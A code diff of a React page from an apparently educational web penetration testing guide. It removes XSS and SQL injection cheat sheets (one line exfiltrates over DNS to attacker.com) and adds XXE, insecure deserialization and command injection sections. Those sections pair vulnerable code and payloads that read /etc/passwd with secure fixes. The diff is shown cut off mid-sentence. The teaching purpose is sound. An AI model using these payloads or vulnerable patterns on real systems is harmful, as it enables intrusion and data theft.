@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import NavBar from '@/components/NavBar';
 import { Shield, ShieldAlert, Code, Bug, Database, Lock, KeyRound, File, FileSearch, ShieldX } from 'lucide-react';
@@ -524,601 +523,210 @@ app.get('/api/users/:userId/profile', checkAccessPermission, (req, res) => {
 });`} 
                       />
                     </section>
-                  </div>
-                </div>
-              </TabsContent>
 
-              {/* Testing Techniques Section */}
-              <TabsContent value="testing-techniques" className="mt-6">
-                <h2 className="section-title">Web Penetration Testing Techniques</h2>
-                
-                <div className="space-y-10 mt-8">
-                  <Card>
-                    <CardHeader>
-                      <CardTitle>Reconnaissance Techniques</CardTitle>
-                    </CardHeader>
-                    <CardContent className="space-y-4">
-                      <div>
-                        <h4 className="font-semibold text-lg mb-2">Passive Information Gathering</h4>
-                        <ul className="list-disc pl-6 space-y-1">
-                          <li>WHOIS and DNS records analysis</li>
-                          <li>Search engine reconnaissance</li>
-                          <li>Social media investigation</li>
-                          <li>Public data breach analysis</li>
-                          <li>Job posting analysis</li>
-                        </ul>
-                      </div>
-                      
-                      <div>
-                        <h4 className="font-semibold text-lg mb-2">Active Information Gathering</h4>
-                        <ul className="list-disc pl-6 space-y-1">
-                          <li>Port scanning (Nmap)</li>
-                          <li>Subdomain enumeration</li>
-                          <li>Technology stack identification (Wappalyzer)</li>
-                          <li>Directory and file brute-forcing</li>
-                          <li>Parameter discovery</li>
-                        </ul>
-                      </div>
-                    </CardContent>
-                  </Card>
-                  
-                  <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
-                    <Card>
-                      <CardHeader>
-                        <CardTitle>Manual Testing Approaches</CardTitle>
-                      </CardHeader>
-                      <CardContent>
-                        <ul className="list-disc pl-6 space-y-2">
-                          <li>
-                            <strong>Content Discovery</strong> - Exploring application structure to find hidden or unlinked content
-                          </li>
-                          <li>
-                            <strong>Parameter Manipulation</strong> - Testing how the application handles unexpected parameter values
-                          </li>
-                          <li>
-                            <strong>Session Analysis</strong> - Examining how sessions are created, managed, and destroyed
-                          </li>
-                          <li>
-                            <strong>Authentication Testing</strong> - Probing for weaknesses in login flows, password policies and resets
-                          </li>
-                          <li>
-                            <strong>Authorization Testing</strong> - Checking access controls by attempting to access resources horizontally and vertically
-                          </li>
-                          <li>
-                            <strong>Business Logic Testing</strong> - Identifying flaws in business processes that can be exploited
-                          </li>
-                        </ul>
-                      </CardContent>
-                    </Card>
-                    
-                    <Card>
-                      <CardHeader>
-                        <CardTitle>Automated Testing Tools</CardTitle>
-                      </CardHeader>
-                      <CardContent>
-                        <ul className="list-disc pl-6 space-y-2">
-                          <li>
-                            <strong>Web Vulnerability Scanners</strong> - Automated tools like OWASP ZAP, Burp Suite, and Acunetix
-                          </li>
-                          <li>
-                            <strong>Fuzzing</strong> - Using tools like Wfuzz or custom scripts to test input handling
-                          </li>
-                          <li>
-                            <strong>Static Code Analysis</strong> - Using tools like SonarQube, Checkmarx, or Semgrep to analyze source code
-                          </li>
-                          <li>
-                            <strong>Dynamic Analysis</strong> - Runtime testing with tools like OWASP ZAP or Burp Suite
-                          </li>
-                          <li>
-                            <strong>API Testing</strong> - Using Postman, Insomnia, or custom scripts to test API endpoints
-                          </li>
-                        </ul>
-                      </CardContent>
-                    </Card>
-                  </div>
-                  
-                  <Card>
-                    <CardHeader>
-                      <CardTitle>Proxy-Based Testing</CardTitle>
-                    </CardHeader>
-                    <CardContent>
-                      <p className="mb-4">
-                        Proxy-based testing is a fundamental technique where testers route web traffic through an intercepting proxy
-                        to observe, manipulate, and repeat requests. This provides visibility into all interactions between client and server.
+                    {/* XML External Entity */}
+                    <section id="xxe" className="scroll-mt-20">
+                      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">XML External Entity (XXE)</h3>
+                      <p className="mb-6">
+                        XML External Entity (XXE) attacks occur when an application processes XML from untrusted sources without
+                        properly disabling external entity references. Attackers can exploit vulnerable XML processors to access
+                        local files, perform server-side request forgery, internal port scanning, or remote code execution.
                       </p>
                       
-                      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
-                        <div className="border border-cybr-muted p-4 rounded-lg">
-                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Key Capabilities</h4>
-                          <ul className="list-disc pl-6 space-y-1">
-                            <li>Intercept and modify requests/responses</li>
-                            <li>Analyze headers, cookies, and parameters</li>
-                            <li>Test input validation by modifying values</li>
-                            <li>Replay and automate requests</li>
-                            <li>Test for client-side vulnerabilities</li>
-                          </ul>
-                        </div>
-                        
-                        <div className="border border-cybr-muted p-4 rounded-lg">
-                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Popular Tools</h4>
-                          <ul className="list-disc pl-6 space-y-1">
-                            <li><strong>Burp Suite</strong> - Industry standard with extensive capabilities</li>
-                            <li><strong>OWASP ZAP</strong> - Free open-source alternative with active scanning</li>
-                            <li><strong>Fiddler</strong> - Web debugging proxy with strong .NET integration</li>
-                            <li><strong>Mitmproxy</strong> - Command-line based intercepting proxy</li>
-                          </ul>
-                        </div>
-                      </div>
-                    </CardContent>
-                  </Card>
-                </div>
-              </TabsContent>
+                      <h4 className="text-xl font-semibold mt-6 mb-3">Example Attack</h4>
+                      <CodeExample 
+                        language="xml" 
+                        isVulnerable={true}
+                        title="Malicious XXE Payload" 
+                        code={`<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<userInfo>
+  <firstName>John</firstName>
+  <lastName>&xxe;</lastName>
+</userInfo>
 
-              {/* Mitigation Strategies Section */}
-              <TabsContent value="mitigation-strategies" className="mt-6">
-                <h2 className="section-title">Web Security Mitigation Strategies</h2>
-                
-                <div className="space-y-10 mt-8">
-                  <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
-                    <SecurityCard
-                      title="Input Validation"
-                      description="Validate all input on the server side using whitelisting, not blacklisting. Apply context-specific validation for different data types."
-                      icon={<Code className="h-6 w-6" />}
-                      severity="high"
-                    />
-                    <SecurityCard
-                      title="Output Encoding"
-                      description="Encode output data based on the context where it will be displayed (HTML, JavaScript, CSS, URLs, etc.) to prevent injection attacks."
-                      icon={<Code className="h-6 w-6" />}
-                      severity="high"
-                    />
-                    <SecurityCard
-                      title="Authentication Controls"
-                      description="Implement MFA, strong password policies, secure credential storage, and protection against brute force attacks."
-                      icon={<Lock className="h-6 w-6" />}
-                      severity="high"
-                    />
-                  </div>
-                  
-                  <Card>
-                    <CardHeader>
-                      <CardTitle>Security Headers Implementation</CardTitle>
-                    </CardHeader>
-                    <CardContent>
-                      <p className="mb-4">
-                        HTTP security headers provide an additional layer of security by helping to mitigate certain types of attacks.
-                        Here are the key security headers that should be implemented:
-                      </p>
+<!-- When processed, this XML will try to read /etc/passwd and include its contents
+     in the lastName field, potentially revealing sensitive system information -->`} 
+                      />
                       
                       <CodeExample 
                         language="javascript" 
                         isVulnerable={false}
-                        title="Implementing Security Headers (Express.js)" 
-                        code={`// Express.js example using helmet middleware
-const express = require('express');
-const helmet = require('helmet');
-const app = express();
+                        title="Secure XML Processing" 
+                        code={`// Disable XXE in Java
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
 
-// Apply helmet middleware (sets various security headers)
-app.use(helmet());
+// Disable XXE in PHP
+libxml_disable_entity_loader(true);
 
-// Custom CSP configuration
-app.use(helmet.contentSecurityPolicy({
-  directives: {
-    defaultSrc: ["'self'"],
-    scriptSrc: ["'self'", "trusted-cdn.com"],
-    styleSrc: ["'self'", "trusted-cdn.com"],
-    imgSrc: ["'self'", "data:", "trusted-cdn.com"],
-    connectSrc: ["'self'", "api.trusted-service.com"],
-    fontSrc: ["'self'", "trusted-cdn.com"],
-    objectSrc: ["'none'"],
-    upgradeInsecureRequests: [],
-  }
-}));
+// Disable XXE in .NET
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Prohibit;
+settings.XmlResolver = null;`} 
+                      />
+                    </section>
 
-// Set custom security headers
-app.use((req, res, next) => {
-  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
-  next();
-});`} 
+                    {/* Insecure Deserialization */}
+                    <section id="deserial" className="scroll-mt-20">
+                      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Insecure Deserialization</h3>
+                      <p className="mb-6">
+                        Insecure deserialization occurs when an application deserializes untrusted data without sufficient verification,
+                        allowing attackers to manipulate serialized objects to achieve harmful results, including remote code execution.
+                        This vulnerability can lead to serious attacks like authentication bypass, privilege escalation, and injection attacks.
+                      </p>
+                      
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                        <SecurityCard
+                          title="Immediate Impact"
+                          description="Remote code execution, application crashes, and complex replay attacks that bypass authentication and authorization."
+                          severity="high"
+                        />
+                        <SecurityCard
+                          title="Vulnerable Languages"
+                          description="Java, PHP, Python, and .NET are commonly affected due to their powerful serialization frameworks."
+                          severity="high"
+                        />
+                      </div>
+                      
+                      <CodeExample 
+                        language="php" 
+                        isVulnerable={true}
+                        title="Vulnerable PHP Deserialization" 
+                        code={`<?php
+// Vulnerable code accepts serialized object from user
+$userData = unserialize($_COOKIE['user_data']);
+
+// Attacker-controlled cookie might contain:
+// O:8:"UserInfo":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}
+// This could create an object with unauthorized admin privileges
+?>`} 
                       />
                       
-                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-6">
-                        <div className="border border-cybr-muted p-4 rounded-lg">
-                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Critical Security Headers</h4>
-                          <ul className="list-disc pl-6 space-y-1">
-                            <li><code>Content-Security-Policy</code> - Controls allowed sources of content</li>
-                            <li><code>X-XSS-Protection</code> - Enables browser's XSS filter</li>
-                            <li><code>X-Frame-Options</code> - Prevents clickjacking attacks</li>
-                            <li><code>X-Content-Type-Options</code> - Prevents MIME type sniffing</li>
-                            <li><code>Strict-Transport-Security</code> - Forces HTTPS connections</li>
-                          </ul>
-                        </div>
-                        
-                        <div className="border border-cybr-muted p-4 rounded-lg">
-                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Additional Security Headers</h4>
-                          <ul className="list-disc pl-6 space-y-1">
-                            <li><code>Referrer-Policy</code> - Controls information in the Referer header</li>
-                            <li><code>Permissions-Policy</code> - Controls browser features/APIs</li>
-                            <li><code>Cache-Control</code> - Prevents caching of sensitive data</li>
-                            <li><code>Clear-Site-Data</code> - Clears browsing data</li>
-                            <li><code>Cross-Origin-Embedder-Policy</code> - Resource isolation</li>
-                            <li><code>Cross-Origin-Opener-Policy</code> - Window isolation</li>
-                          </ul>
-                        </div>
-                      </div>
-                    </CardContent>
-                  </Card>
-                  
-                  <Card>
-                    <CardHeader>
-                      <CardTitle>Secure Development Practices</CardTitle>
-                    </CardHeader>
-                    <CardContent>
-                      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
-                        <div>
-                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Secure Coding Standards</h4>
-                          <ul className="list-disc pl-6 space-y-2">
-                            <li>Follow the principle of least privilege for all components</li>
-                            <li>Implement proper error handling without revealing sensitive details</li>
-                            <li>Use parameterized queries for all database operations</li>
-                            <li>Apply defense in depth with multiple security layers</li>
-                            <li>Maintain secure dependency management with regular updates</li>
-                            <li>Follow language-specific secure coding guidelines</li>
-                          </ul>
-                        </div>
-                        
-                        <div>
-                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Security Testing Integration</h4>
-                          <ul className="list-disc pl-6 space-y-2">
-                            <li>Incorporate SAST tools in CI/CD pipelines</li>
-                            <li>Implement regular DAST scanning</li>
-                            <li>Conduct code reviews with security focus</li>
-                            <li>Run periodic penetration tests</li>
-                            <li>Use dependency scanners to detect vulnerable packages</li>
-                            <li>Implement security regression testing</li>
-                          </ul>
-                        </div>
-                      </div>
-                    </CardContent>
-                  </Card>
-                </div>
-              </TabsContent>
+                      <CodeExample 
+                        language="javascript" 
+                        isVulnerable={false}
+                        title="Safe Alternative" 
+                        code={`// Use JSON instead of serialized objects
+const userData = JSON.parse(cookie);
 
-              {/* Tools & Cheat Sheets Section */}
-              <TabsContent value="tools-cheatsheets" className="mt-6">
-                <h2 className="section-title">Web Penetration Testing Tools & Cheat Sheets</h2>
-                
-                <div className="space-y-10 mt-8">
-                  <h3 className="text-2xl font-bold mb-4">Essential Penetration Testing Tools</h3>
-                  
-                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-                    <Card className={cn("transition-all hover:shadow-lg hover:shadow-cybr-primary/10")}>
-                      <CardHeader className="bg-cybr-muted/30 border-b border-cybr-muted">
-                        <CardTitle>Burp Suite</CardTitle>
-                        <CardDescription>Web vulnerability scanner & proxy</CardDescription>
-                      </CardHeader>
-                      <CardContent className="pt-4">
-                        <p className="mb-4">A comprehensive platform for web application security testing. Available as both free and professional versions.</p>
-                        <ul className="list-disc pl-6 space-y-1">
-                          <li>Intercepting proxy</li>
-                          <li>Scanner for automated detection</li>
-                          <li>Intruder for fuzzing & brute-forcing</li>
-                          <li>Repeater for request manipulation</li>
-                          <li>Extensible with plugins</li>
-                        </ul>
-                      </CardContent>
-                    </Card>
-                    
-                    <Card className={cn("transition-all hover:shadow-lg hover:shadow-cybr-primary/10")}>
-                      <CardHeader className="bg-cybr-muted/30 border-b border-cybr-muted">
-                        <CardTitle>OWASP ZAP</CardTitle>
-                        <CardDescription>Free security testing suite</CardDescription>
-                      </CardHeader>
-                      <CardContent className="pt-4">
-                        <p className="mb-4">A free, open-source penetration testing tool for finding vulnerabilities in web applications.</p>
-                        <ul className="list-disc pl-6 space-y-1">
-                          <li>Automated scanner</li>
-                          <li>Intercepting proxy</li>
-                          <li>Fuzzing capabilities</li>
-                          <li>REST API for automation</li>
-                          <li>Active community support</li>
-                        </ul>
-                      </CardContent>
-                    </Card>
-                    
-                    <Card className={cn("transition-all hover:shadow-lg hover:shadow-cybr-primary/10")}>
-                      <CardHeader className="bg-cybr-muted/30 border-b border-cybr-muted">
-                        <CardTitle>Metasploit</CardTitle>
-                        <CardDescription>Exploitation framework</CardDescription>
-                      </CardHeader>
-                      <CardContent className="pt-4">
-                        <p className="mb-4">A comprehensive tool for developing, testing, and executing exploits.</p>
-                        <ul className="list-disc pl-6 space-y-1">
-                          <li>Exploit development framework</li>
-                          <li>Large database of known vulnerabilities</li>
-                          <li>Post-exploitation capabilities</li>
-                          <li>Auxiliary scanning modules</li>
-                          <li>Payload generation tools</li>
-                        </ul>
-                      </CardContent>
-                    </Card>
-                  </div>
-                  
-                  <h3 className="text-2xl font-bold mb-4 mt-8">Specialized Testing Tools</h3>
-                  
-                  <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
-                    {[
-                      {
-                        name: "Nmap",
-                        description: "Network discovery and security auditing",
-                        features: ["Port scanning", "OS detection", "Service version detection"]
-                      },
-                      {
-                        name: "sqlmap",
-                        description: "Automated SQL injection detection and exploitation",
-                        features: ["Database fingerprinting", "Data extraction", "Access underlying file system"]
-                      },
-                      {
-                        name: "Nikto",
-                        description: "Web server scanner for dangerous files/CGIs",
-                        features: ["Checks for outdated servers", "Default files detection", "Insecure configurations"]
-                      },
-                      {
-                        name: "Dirb/Gobuster",
-                        description: "Web content scanner",
-                        features: ["Directory brute forcing", "Hidden file discovery", "Multiple wordlists"]
-                      },
-                      {
-                        name: "Amass",
-                        description: "Network mapping of attack surfaces & external asset discovery",
-                        features: ["DNS enumeration", "Certificate transparency", "API integrations"]
-                      },
-                      {
-                        name: "OWASP Amass",
-                        description: "In-depth Attack Surface Mapping",
-                        features: ["Subdomain enumeration", "Internet data collection", "Graph database"]
-                      },
-                      {
-                        name: "Nuclei",
-                        description: "Vulnerability scanner with templates",
-                        features: ["Customizable templates", "Fast scanning", "Low false-positive rate"]
-                      },
-                      {
-                        name: "Wfuzz",
-                        description: "Web application bruteforcer",
-                        features: ["Parameter fuzzing", "POST data fuzzing", "Header fuzzing"]
-                      }
-                    ].map((tool, index) => (
-                      <div key={index} className="border border-cybr-muted rounded-lg p-4 bg-cybr-card-muted transition-all hover:border-cybr-primary/40">
-                        <h4 className="font-bold text-lg text-cybr-primary">{tool.name}</h4>
-                        <p className="text-sm opacity-70 mb-3">{tool.description}</p>
-                        <ul className="list-disc list-inside text-sm space-y-1">
-                          {tool.features.map((feature, i) => (
-                            <li key={i}>{feature}</li>
-                          ))}
-                        </ul>
-                      </div>
-                    ))}
-                  </div>
-                  
-                  <h3 className="text-2xl font-bold mb-6 mt-8">Quick Reference Cheat Sheets</h3>
-                  
-                  <div className="overflow-x-auto">
-                    <Card>
-                      <CardHeader>
-                        <CardTitle>XSS Cheat Sheet</CardTitle>
-                        <CardDescription>Common payloads and bypass techniques</CardDescription>
-                      </CardHeader>
-                      <CardContent>
-                        <CodeExample 
-                          language="html" 
-                          title="Basic XSS Payloads" 
-                          code={`<!-- Basic alert -->
-<script>alert('XSS')</script>
+// Explicitly validate data after parsing
+if (!isValidUserData(userData)) {
+  throw new Error("Invalid user data");
+}
 
-<!-- Event handlers -->
-<img src="x" onerror="alert('XSS')">
-<body onload="alert('XSS')">
-
-<!-- JavaScript URI -->
-<a href="javascript:alert('XSS')">Click me</a>
-
-<!-- Bypass techniques -->
-<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
-<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
-<svg><script>alert&#40;1&#41;</script>
-
-<!-- DOM-based examples -->
-<script>document.write('<img src="x" onerror="alert(1)">');</script>
-`} 
-                        />
-                      </CardContent>
-                    </Card>
-                  </div>
-                  
-                  <div className="overflow-x-auto mt-6">
-                    <Card>
-                      <CardHeader>
-                        <CardTitle>SQL Injection Cheat Sheet</CardTitle>
-                        <CardDescription>Detection and exploitation techniques</CardDescription>
-                      </CardHeader>
-                      <CardContent>
-                        <CodeExample 
-                          language="sql" 
-                          title="SQL Injection Techniques" 
-                          code={`-- Basic tests to confirm vulnerability
-' OR '1'='1
-' OR 1=1--
-" OR 1=1--
-1' OR '1' = '1
-admin'--
-
--- Database identification
-' UNION SELECT @@version--     -- MS SQL
-' UNION SELECT version()--     -- MySQL/PostgreSQL
-' UNION SELECT banner FROM v$version-- -- Oracle
-
--- Extracting data
-' UNION SELECT table_name,1 FROM information_schema.tables--
-' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username,password FROM users--
-
--- Blind SQL injection
-' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)=97--
-' AND IF(SUBSTR(user(),1,1)='r',SLEEP(5),0)--  -- Time-based
-
--- Out-of-band techniques
-' UNION SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\a.txt'))--  -- DNS exfiltration
-`} 
-                        />
-                      </CardContent>
-                    </Card>
-                  </div>
-                </div>
-              </TabsContent>
-
-              {/* Interview Questions Section */}
-              <TabsContent value="interview-questions" className="mt-6">
-                <h2 className="section-title">Web Security Interview Questions</h2>
-                
-                <div className="space-y-10 mt-8">
-                  <Card>
-                    <CardHeader>
-                      <CardTitle>Core Security Concepts</CardTitle>
-                    </CardHeader>
-                    <CardContent>
-                      <div className="space-y-6">
-                        <div>
-                          <p className="font-semibold">Q: What is the difference between authentication and authorization?</p>
-                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
-                            A: Authentication is the process of verifying who a user is (identity verification), 
-                            while authorization is the process of verifying what specific resources, applications, 
-                            and data a user has access to (permission verification). Authentication happens before 
-                            authorization and is a prerequisite for it.
-                          </p>
-                        </div>
-                        
-                        <div>
-                          <p className="font-semibold">Q: Explain the concept of Defense in Depth.</p>
-                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
-                            A: Defense in Depth is a security strategy that employs multiple layers of security controls 
-                            throughout a system, creating redundancy in case one layer fails. It combines people, processes, 
-                            and technology across multiple protection layers to protect valuable data and systems. Examples include 
-                            firewall + WAF + input validation + output encoding to protect against XSS.
-                          </p>
-                        </div>
-                        
-                        <div>
-                          <p className="font-semibold">Q: What are the primary differences between SAST, DAST, and IAST?</p>
-                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
-                            A: SAST (Static Application Security Testing) analyzes source code without executing it to find security vulnerabilities. 
-                            DAST (Dynamic Application Security Testing) tests running applications from the outside by simulating attacks. 
-                            IAST (Interactive Application Security Testing) combines both approaches by instrumenting the application to monitor 
-                            its behavior during testing and detect vulnerabilities in real-time.
-                          </p>
-                        </div>
-                      </div>
-                    </CardContent>
-                  </Card>
-                  
-                  <Card>
-                    <CardHeader>
-                      <CardTitle>Vulnerability Assessment</CardTitle>
-                    </CardHeader>
-                    <CardContent>
-                      <div className="space-y-6">
-                        <div>
-                          <p className="font-semibold">Q: How would you test for DOM-based XSS vulnerabilities?</p>
-                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
-                            A: To test for DOM-based XSS, I would:
-                            <br />1. Identify sources of user input that are processed by client-side JavaScript (URL parameters, form fields, etc.)
-                            <br />2. Examine how this data is processed and inserted into the DOM using browser developer tools
-                            <br />3. Test payloads through identified sources with particular attention to sink functions like innerHTML, document.write(), eval(), etc.
-                            <br />4. Use tools like DOM Invader (Burp Suite) to automate the discovery process
-                            <br />5. Look for JavaScript frameworks that might have unsafe rendering practices
-                          </p>
-                        </div>
-                        
-                        <div>
-                          <p className="font-semibold">Q: What steps would you take to detect and exploit Server-Side Request Forgery (SSRF)?</p>
-                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
-                            A: To detect SSRF vulnerabilities:
-                            <br />1. Identify endpoints that accept URLs or make server-side requests (image/file processors, webhooks, integrations)
-                            <br />2. Test these endpoints with URLs pointing to internal services (localhost, 127.0.0.1, internal IPs)
-                            <br />3. Use DNS rebinding or external servers I control to detect blind SSRF
-                            <br />4. Try accessing cloud provider metadata endpoints (169.254.169.254)
-                            <br />5. Use different URL formats, protocols, and IP representations to bypass filters
-                            <br />6. If successful, map internal networks, access sensitive internal services, or retrieve metadata
-                          </p>
-                        </div>
-                        
-                        <div>
-                          <p className="font-semibold">Q: How do you determine if an application is vulnerable to IDOR?</p>
-                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
-                            A: To test for IDOR vulnerabilities:
-                            <br />1. Identify endpoints that access specific resources through identifiers (IDs, references in URLs/parameters)
-                            <br />2. Create multiple test accounts to compare access permissions
-                            <br />3. Modify resource identifiers in requests to attempt accessing other users' data
-                            <br />4. Check if predictable/sequential resource IDs are used
-                            <br />5. Look for encoded/hashed identifiers and analyze their patterns
-                            <br />6. Test both horizontal (same privilege level) and vertical (higher privilege) access controls
-                            <br />7. Check if access controls exist but are only enforced in the UI, not on the backend
-                          </p>
-                        </div>
-                      </div>
-                    </CardContent>
-                  </Card>
-                  
-                  <Card>
-                    <CardHeader>
-                      <CardTitle>Advanced Security Scenarios</CardTitle>
-                    </CardHeader>
-                    <CardContent>
-                      <div className="space-y-6">
-                        <div>
-                          <p className="font-semibold">Q: How would you secure a JWT implementation?</p>
-                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
-                            A: To secure a JWT implementation:
-                            <br />1. Use strong signing algorithms (RS256, ES256) instead of weak ones (none, HS256 with short keys)
-                            <br />2. For sensitive applications, use asymmetric keys (private key to sign, public key to verify)
-                            <br />3. Set appropriate expiration times (exp claim) to limit token validity
-                            <br />4. Implement token rotation and proper revocation mechanisms
-                            <br />5. Store tokens securely (HttpOnly cookies with Secure flag for web apps)
-                            <br />6. Include audience (aud), issuer (iss), and other claims to prevent token reuse across services
-                            <br />7. Don't store sensitive data in JWTs as they are base64 encoded, not encrypted
-                            <br />8. Validate all received tokens (signature, claims, expiration) before trusting them
-                          </p>
-                        </div>
-                        
-                        <div>
-                          <p className="font-semibold">Q: How would you test and prevent prototype pollution in JavaScript applications?</p>
-                          <p className="mt-2 pl-4 border-l-2 border-cybr-primary">
-                            A: For prototype pollution testing:
-                            <br />1. Identify endpoints that accept and parse JSON data
-                            <br />2. Test by injecting "__proto__", "constructor" or "prototype" properties in JSON payloads
-                            <br />3. Check if global Object properties can be polluted with malicious values
-                            <br />4. Monitor for unexpected behavior after pollution attempts
-                            <br />
-                            <br />Prevention measures:
-                            <br />1. Use Object.create(null) to create objects without prototype
-                            <br />2. Freeze the Object prototype: Object.freeze(Object.prototype)
-                            <br />3. Use safe object merging libraries or techniques that don't merge "__proto__" properties
-                            <br />4. Validate and sanitize all user input that will be used in object operations
-                            <br />5. Consider using libraries like Lodash with "_.merge" replaced by "_.mergeWith" and proper checks
-                          </p>
-                        </div>
-                      </div>
-                    </CardContent>
-                  </Card>
-                </div>
-              </TabsContent>
-            </Tabs>
-          </div>
-        </div>
-      </main>
-    </div>
-  );
+// Explicitly set properties from the validated data
+const user = {
+  username: userData.username,
+  // Don't directly copy admin flag from user input
 };
 
-export default WebPenetrationTesting;
+// Check permissions through proper authorization system
+const isAdmin = authorizationService.isAdmin(user.username);`} 
+                      />
+                    </section>
+
+                    {/* Command Injection */}
+                    <section id="cmd-injection" className="scroll-mt-20">
+                      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Command Injection</h3>
+                      <p className="mb-6">
+                        Command injection occurs when an application passes unsafe user-supplied data to a system shell. 
+                        Attackers can inject operating system commands to execute arbitrary code on the host server,
+                        potentially leading to complete system compromise.
+                      </p>
+                      
+                      <h4 className="text-xl font-semibold mt-6 mb-3">Example Attack</h4>
+                      <CodeExample 
+                        language="javascript" 
+                        isVulnerable={true}
+                        title="Vulnerable Implementation" 
+                        code={`// Node.js example with command injection vulnerability
+const { exec } = require('child_process');
+
+app.get('/ping', (req, res) => {
+  const host = req.query.host;
+  // Vulnerable: user input directly concatenated into command
+  exec('ping -c 4 ' + host, (error, stdout, stderr) => {
+    res.send(stdout);
+  });
+});
+
+// Attacker input: 8.8.8.8; cat /etc/passwd
+// This will ping 8.8.8.8 and then output the passwd file`} 
+                      />
+                      
+                      <CodeExample 
+                        language="javascript" 
+                        isVulnerable={false}
+                        title="Secure Implementation" 
+                        code={`// Using a safer method with parameter validation
+const { execFile } = require('child_process');
+const validator = require('validator');
+
+app.get('/ping', (req, res) => {
+  const host = req.query.host;
+  
+  // Validate input is a valid IP address or hostname
+  if (!validator.isIP(host) && !validator.isFQDN(host)) {
+    return res.status(400).send('Invalid host format');
+  }
+  
+  // execFile doesn't invoke a shell and treats arguments separately
+  execFile('ping', ['-c', '4', host], (error, stdout, stderr) => {
+    if (error) {
+      return res.status(500).send('Error executing ping');
+    }
+    res.send(stdout);
+  });
+});`} 
+                      />
+                    </section>
+
+                    {/* Security Misconfigurations */}
+                    <section id="misconfig" className="scroll-mt-20">
+                      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Security Misconfigurations</h3>
+                      <p className="mb-6">
+                        Security misconfigurations include improperly configured permissions, unnecessary features enabled, 
+                        default accounts/passwords, overly informative error messages, and missing security hardening. 
+                        These are often the result of insecure default configurations, incomplete configurations, or ad hoc changes.
+                      </p>
+                      
+                      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
+                        <SecurityCard
+                          title="Default Configurations"
+                          description="Using default settings from sample applications, cloud services, or pre-configured development environments."
+                          severity="high"
+                        />
+                        <SecurityCard
+                          title="Unnecessary Features"
+                          description="Unused features and frameworks that expand attack surface without providing value."
+                          severity="medium"
+                        />
+                        <SecurityCard
+                          title="Missing Updates"
+                          description="Unpatched flaws in the application stack, including OS, web server, DBMS, and libraries."
+                          severity="high"
+                        />
+                      </div>
+                      
+                      <h4 className="text-xl font-semibold mt-6 mb-3">Common Misconfigurations</h4>
+                      <ul className="list-disc pl-6 space-y-2">
+                        <li>Directory listing enabled on the server</li>
+                        <li>Default or weak credentials for administrative interfaces</li>
+                        <li>Application servers with debug mode enabled in production</li>
+                        <li>Missing HTTP security headers or improper CORS settings</li>
+                        <li>Error messages revealing stack traces or sensitive information</li>
+                        <li>Outdated or vulnerable system components</li>
+                        <li>Unnecessary services running on the server</li>
+                      </ul>
+                    </section>
+
+                    {/* Path Traversal */}
+                    <section id="file-traversal" className="scroll-mt-20">
+                      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">File Inclusion/Path Traversal</h3>
+                      <p className="mb-6">
+                        Path traversal (also known as directory traversal) attacks exploit insufficient input validation to 
+                        access files and directories
